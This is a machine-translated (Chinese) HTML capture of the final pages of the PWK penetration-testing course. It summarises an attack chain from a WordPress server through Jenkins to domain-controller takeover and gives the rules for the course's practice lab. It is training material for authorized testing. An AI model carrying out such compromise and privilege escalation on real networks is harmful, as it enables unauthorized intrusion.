<div style="position:absolute;top:49993;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:49993;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">851</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></nobr></div>
<div style="position:absolute;top:49028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙箱\管理员</font></font></nobr></div>
<div style="position:absolute;top:49062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Administrator\Documents&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名</font></font></font></b></nobr></div>
<div style="position:absolute;top:49080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名</font></font></nobr></div>
<div style="position:absolute;top:49096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙盒数据中心</font></font></nobr></div>
<div style="position:absolute;top:49130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\管理员\文档&gt;</font></font></nobr></div>
<div style="position:absolute;top:49149;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1011 - 在 DC 上与会话交互</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以使用管理用户访问域控制器，并且我们已经达到</font></font></nobr></div>
<div style="position:absolute;top:49198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的目标。</font><font style="vertical-align: inherit;">在这一点上，我们可以得出结论，这个渗透测试是成功的。</font><font style="vertical-align: inherit;">但请记住，在许多</font></font></nobr></div>
<div style="position:absolute;top:49218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试，获取域管理员并不总是主要目标。</font><font style="vertical-align: inherit;">很多时候，一个</font></font></nobr></div>
<div style="position:absolute;top:49237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户可能更关心他们存储的数据，而不是对其系统的访问。</font><font style="vertical-align: inherit;">尽管</font></font></nobr></div>
<div style="position:absolute;top:49256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员及其系统的访问权限可能用于获取对数据的访问权限，而不是</font></font></nobr></div>
<div style="position:absolute;top:49276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">永远是停止点。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:49313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.10</font></font></nobr></div>
<div style="position:absolute;top:49313;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包起来</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们踏上了一段穿越许多隧道和贝壳的旅程。</font><font style="vertical-align: inherit;">我们开始时只有一个</font></font></nobr></div>
<div style="position:absolute;top:49374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名和有关目标的基本信息。</font><font style="vertical-align: inherit;">我们使用我们的渗透测试技能来获得</font></font></nobr></div>
<div style="position:absolute;top:49393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问 WordPress Web 服务器，该服务器后来允许我们破坏数据库。</font><font style="vertical-align: inherit;">数据库</font></font></nobr></div>
<div style="position:absolute;top:49413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为我们提供了进入内部网络的立足点，在那里我们能够访问用户的</font></font></nobr></div>
<div style="position:absolute;top:49432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作站。</font><font style="vertical-align: inherit;">我们提升了用户工作站的权限并获取了有关</font></font></nobr></div>
<div style="position:absolute;top:49451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。</font><font style="vertical-align: inherit;">然后，我们使用内部访问权限在 Jenkins 开发服务器上获得立足点。</font></font></nobr></div>
<div style="position:absolute;top:49471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们在 Jenkins 服务器上升级我们的权限，我们发现域管理员是</font></font></nobr></div>
<div style="position:absolute;top:49490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也登录了。 最后，我们冒充域管理员创建了一个新的域管理员</font></font></nobr></div>
<div style="position:absolute;top:49509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并登录到域控制器。</font><font style="vertical-align: inherit;">在这次旅行中，我们了解到</font></font></nobr></div>
<div style="position:absolute;top:49529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举、隧道挖掘在现实世界中的困难以及许多其他课程。</font></font></nobr></div>
<div style="position:absolute;top:49562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们不建议您在整个渗透测试中做详细的笔记，</font></font></nobr></div>
<div style="position:absolute;top:49581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行某些操作时的良好日志。</font><font style="vertical-align: inherit;">在渗透测试之后，我们必须确保我们</font></font></nobr></div>
<div style="position:absolute;top:49600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让一切保持原样。</font><font style="vertical-align: inherit;">必须删除任何漏洞或外壳，或者至少，</font></font></nobr></div>
<div style="position:absolute;top:49619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应通知客户他们的位置。</font><font style="vertical-align: inherit;">在 PWK 实验室，请还原实验室中的机器</font></font></nobr></div>
<div style="position:absolute;top:49639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦你完成了它们。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:50071;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="43"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 43 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:50104;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:51181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:51181;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:51181;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">852</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:50194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.10.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25. 更努力：实验室</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您已受雇在内部 VPN 实验室网络上执行渗透测试。</font></font></nobr></div>
<div style="position:absolute;top:50284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当然。</font><font style="vertical-align: inherit;">主要目标是在尽可能多的机器和子网上获得尽可能多的 shell</font></font></nobr></div>
<div style="position:absolute;top:50303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能的。</font><font style="vertical-align: inherit;">您的目标是在每个系统上获得尽可能高的权限级别（管理员/root）</font></font></nobr></div>
<div style="position:absolute;top:50323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:50355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以根据需要更改实验室机器上的管理员或 root 密码或添加其他用户</font></font></nobr></div>
<div style="position:absolute;top:50374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到系统，前提是您通过学生控制将机器恢复到原始状态</font></font></nobr></div>
<div style="position:absolute;top:50394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦你完成攻击它。</font><font style="vertical-align: inherit;">有些机器有多个攻击向量，所以它是</font></font></nobr></div>
<div style="position:absolute;top:50413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">强烈建议您花时间尽可能多地定位。</font><font style="vertical-align: inherit;">虽然你肯定</font></font></nobr></div>
<div style="position:absolute;top:50433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 web shell 在机器上获得最初的立足点，你的真正目标是反向 shell 回到你的</font></font></nobr></div>
<div style="position:absolute;top:50452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 虚拟机或 GUI 访问目标。</font></font></nobr></div>
<div style="position:absolute;top:50485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意：位于每台机器上的 proof.txt 文件将记录在您的实验室报告中，</font></font></nobr></div>
<div style="position:absolute;top:50504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你应该选择提交一个。</font><font style="vertical-align: inherit;">这些文件不应被视为最终目标（这是一个渗透</font></font></nobr></div>
<div style="position:absolute;top:50523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试，而不是捕获标志事件）。</font><font style="vertical-align: inherit;">没有比获得高特权贝壳更棒的感觉了</font></font></nobr></div>
<div style="position:absolute;top:50543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室机器，您很快就会体验到这种感觉。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.1 现实生活模拟</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部 VPN 实验室网络包含许多可以利用的模拟客户端</font></font></nobr></div>
<div style="position:absolute;top:50641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端攻击。</font><font style="vertical-align: inherit;">这些客户端被编程为模拟常见的企业用户活动。</font></font></nobr></div>
<div style="position:absolute;top:50660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">整个实验室的微妙提示可以帮助您找到这些模拟客户。</font><font style="vertical-align: inherit;">彻底的后</font></font></nobr></div>
<div style="position:absolute;top:50680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发信息收集还可以揭示客户端机器之间的通信。</font></font></nobr></div>
<div style="position:absolute;top:50712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种模拟客户将在不同的时间间隔执行他们的任务。</font><font style="vertical-align: inherit;">最多</font></font></nobr></div>
<div style="position:absolute;top:50732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常见的间隔是五分钟。</font></font></nobr></div>
<div style="position:absolute;top:50765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些实验室机器包含清理脚本。</font><font style="vertical-align: inherit;">这些用于客户端攻击向量</font></font></nobr></div>
<div style="position:absolute;top:50784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特别是帮助确保机器/服务可供其他学生使用。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.2 机器依赖</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果不首先收集有关另一个目标的特定附加信息，则无法利用某些目标</font></font></nobr></div>
<div style="position:absolute;top:50882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室机器。</font><font style="vertical-align: inherit;">其他人只能通过支点加以利用。</font><font style="vertical-align: inherit;">学生管理员不会提供</font></font></nobr></div>
<div style="position:absolute;top:50902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关机器依赖性的详细信息。</font><font style="vertical-align: inherit;">确定机器是否具有依赖关系是</font></font></nobr></div>
<div style="position:absolute;top:50921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息收集过程的重要组成部分，因此您需要发现这些信息</font></font></nobr></div>
<div style="position:absolute;top:50940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">靠你自己。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.3 解锁网络</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最初，PWK 控制面板将允许您恢复学生网络上的机器以及</font></font></nobr></div>
<div style="position:absolute;top:51039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您自己的专用实验室客户端机器。</font><font style="vertical-align: inherit;">实验室中某些易受攻击的机器将包含一个</font></font></nobr></div>
<div style="position:absolute;top:51058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">network-secret.txt 文件，其中包含 MD5 哈希值。</font><font style="vertical-align: inherit;">这些哈希将解锁您的其他网络</font></font></nobr></div>
<div style="position:absolute;top:51077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制面板。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:51259;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="44"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 44 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:51292;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:52369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:52369;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:52369;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">853</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:51388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.4 路由</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IT、Dev 和 Admin 网络不能直接从公共学生网络路由，但是</font></font></nobr></div>
<div style="position:absolute;top:51449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共学生网络可从所有其他网络路由。</font><font style="vertical-align: inherit;">您将需要使用各种技术</font></font></nobr></div>
<div style="position:absolute;top:51468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在课程中涵盖以访问其他网络。</font><font style="vertical-align: inherit;">例如，您可能需要利用</font></font></nobr></div>
<div style="position:absolute;top:51488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器在防火墙后面进行 NAT，利用双宿主主机或客户端漏洞。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:51525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.5 机器排序和攻击向量</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室机器的 IP 地址并不重要。</font><font style="vertical-align: inherit;">例如，您不需要以</font></font></nobr></div>
<div style="position:absolute;top:51586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.1 并按数字顺序浏览机器。</font><font style="vertical-align: inherit;">最重要的之一</font></font></nobr></div>
<div style="position:absolute;top:51605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为渗透测试人员，您需要学习的技能是如何按顺序扫描多台机器</font></font></nobr></div>
<div style="position:absolute;top:51624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">寻找悬而未决的果实。</font><font style="vertical-align: inherit;">另外，请记住，您可能无法完全妥协</font></font></nobr></div>
<div style="position:absolute;top:51644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定网络，而无需先进入另一个网络。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:51681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.6 防火墙/路由器/NAT</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将网络连接在一起的防火墙和其他网络设备不是直接</font></font></nobr></div>
<div style="position:absolute;top:51742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可利用的。</font><font style="vertical-align: inherit;">尽管它们在范围内并且您可能会尝试访问它们，但它们不是</font></font></nobr></div>
<div style="position:absolute;top:51761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有意为您创建。</font><font style="vertical-align: inherit;">此外，长时间的攻击，如暴力破解或</font></font></nobr></div>
<div style="position:absolute;top:51781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">强烈建议不要使用 DOS/DDOS，因为它们会渲染防火墙以及任何额外的</font></font></nobr></div>
<div style="position:absolute;top:51800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到它们的网络，您和其他学生无法访问。</font></font></nobr></div>
<div style="position:absolute;top:51833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室中的许多机器启用了软件防火墙，可能无法响应 ICMP</font></font></nobr></div>
<div style="position:absolute;top:51852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声请求。</font><font style="vertical-align: inherit;">如果 IP 地址不响应 ICMP 回显请求，这不一定</font></font></nobr></div>
<div style="position:absolute;top:51872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示目标机器已关闭或不存在。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:51909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.7 密码</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">花费大量时间破解所有用户的 root 或管理员密码</font></font></nobr></div>
<div style="position:absolute;top:51970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不需要实验室中的机器。</font><font style="vertical-align: inherit;">如果你已经尝试了 Kali 中所有可用的词表，并且使用过</font></font></nobr></div>
<div style="position:absolute;top:51989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">整个实验室收集的信息，停止并考虑不同的攻击向量。</font><font style="vertical-align: inherit;">如果你有</font></font></nobr></div>
<div style="position:absolute;top:52008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重要的破解硬件，然后随意继续破解尽可能多的密码</font></font></nobr></div>
<div style="position:absolute;top:52028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:52065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.8 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您已花时间了解课本中介绍的课程材料，并且</font></font></nobr></div>
<div style="position:absolute;top:52126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相关视频并已完成所有练习（包括“额外一英里”练习），您将</font></font></nobr></div>
<div style="position:absolute;top:52145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">享受完整的实验室评估。</font><font style="vertical-align: inherit;">如果您遇到问题，请考虑填补知识空白</font></font></nobr></div>
<div style="position:absolute;top:52165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">课程材料，如果你仍然被卡住，退后一步并采取新的观点。</font><font style="vertical-align: inherit;">很容易得到</font></font></nobr></div>
<div style="position:absolute;top:52184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专注于一个单一的挑战，而忽视了可能有更简单的解决方案在等待这一事实</font></font></nobr></div>
<div style="position:absolute;top:52204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">走不同的道路。</font><font style="vertical-align: inherit;">做好笔记并经常复习，寻找替代路径</font></font></nobr></div>
<div style="position:absolute;top:52223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能会推进您的评估。</font><font style="vertical-align: inherit;">当所有其他方法都失败时，请不要犹豫与学生联系</font></font></nobr></div>
<div style="position:absolute;top:52242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员。</font><font style="vertical-align: inherit;">最后，请记住，您通常拥有解决问题所需的所有知识</font></font></nobr></div>
<div style="position:absolute;top:52262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">问题摆在你面前。</font><font style="vertical-align: inherit;">不要放弃，记住“Try Harder”纪律！</font></font></nobr></div>
</span></font>


<script>_addload(function(){_setupIW('com');_csi('en','zh-CN','o3cp%5B810-853%5D.pdf');});</script>
            <script>
              function gtElInit() {
                var lib = new google.translate.TranslateService();
                lib.setCheckVisibility(false);
                lib.translatePage('en', 'zh-CN', function (progress, done, error) {
                  if (progress == 100 || done || error) {
                    document.getElementById("gt-dt-spinner").style.display = "none";
                  }
                });
              }
            </script>
            <script src="./o3cp[810-853]_files/f.txt">
            </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./o3cp[810-853]_files/translate_24dp.png" width="20" height="20" alt="Google 翻译"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">原文</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">提供更好的翻译建议</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
          <div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><span><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[810-853]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iws_w.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iws_e.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iws_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iws_nw" style="overflow: hidden;"></div><div class="SPRITE_iws_ne" style="overflow: hidden;"></div><div class="SPRITE_iws_sw" style="overflow: hidden;"></div><div class="SPRITE_iws_se" style="overflow: hidden;"></div><div class="SPRITE_iws_tap" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_l" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_u" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ul" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_rd" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ld" style="overflow: hidden;"></div><div class="SPRITE_iws_tab_dl" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_dr" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_l" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_r" style="overflow: hidden; display: none;"></div></div></span><div id="google-infowindow" class="notranslate"><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[810-853]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iw_w.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iw_e.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[810-853]_files/iw_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iw_nw" style="overflow: hidden;"></div><div class="SPRITE_iw_ne" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_l" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_u" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ul" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_rd" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ld" style="overflow: hidden;"></div><div class="SPRITE_iw_sw0" style="overflow: hidden;"></div><div class="SPRITE_iw_se0" style="overflow: hidden;"></div><div class="SPRITE_close" style="overflow: hidden; z-index: 10000; cursor: pointer; visibility: visible;"></div><div class="SPRITE_maximize" style="overflow: hidden; z-index: 10000; visibility: hidden; cursor: pointer; display: none;"></div><div class="SPRITE_restore" style="overflow: hidden; z-index: 10001; visibility: hidden; cursor: pointer; display: none;"></div></div></div><div style="display: none;"><iframe sandbox="" id="google-feedback-frame" name="FEEDBACK_TARGET_IFRAME_NAME" src="./o3cp[810-853]_files/saved_resource.html"></iframe></div></body></html>